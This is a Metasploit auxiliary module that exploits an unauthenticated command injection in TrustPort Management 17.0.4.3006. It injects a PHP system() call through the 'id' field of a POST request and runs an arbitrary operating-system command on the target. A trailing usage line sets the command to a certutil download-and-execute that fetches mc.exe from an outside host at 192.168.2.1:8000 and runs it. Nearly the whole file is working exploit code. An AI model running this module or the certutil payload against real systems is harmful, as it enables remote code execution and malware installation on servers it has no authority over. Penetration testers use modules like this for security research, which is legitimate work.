##
#
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TrustPort Management Unauthenticated Command Injection',
      'Description'    => %q{
           This module exploits a command injection flaw in TrustPort Management 17.0.4.3006.
      },
      'References'     => [['url', 'https://blogs.securiteam.com/index.php/archives/3685#more-3685']],
      'Author'         => [ 'Mario Ceballos',],
      'License'        => 'BSD_LICENSE',
      'DisclosureDate' => "Mar 6 2018"
   ))

  register_options(
    [
      OptString.new('CMD', [ true,  "The command to run", 'calc.exe']),
      Opt::RPORT(20394),
      OptBool.new('SSL', [true, 'Use SSL', true]),
    ],)
  end

  def run
    x = datastore['CMD']
    cmds = Rex::Text.uri_encode("system('#{x}')")

    res = send_request_cgi({
      'uri'   => "/get/settings-set-user-perms.php",
      'method' => 'POST',
      'data'   => "id=#{Rex::Text.rand_text_base64(5)}';#{cmds};//&rights=",
    }, 10)
		
    print_status "Sending command '#{x}'..."

    if !res
	print_good "Worked?"
    end

    if res and res.code == 200
       puts res.body
    end
  end
end
__END__
set CMD "certutil.exe -urlcache -split -f http://192.168.2.1:8000/mc.exe C:\\mc.exe && C:\\mc.exe"
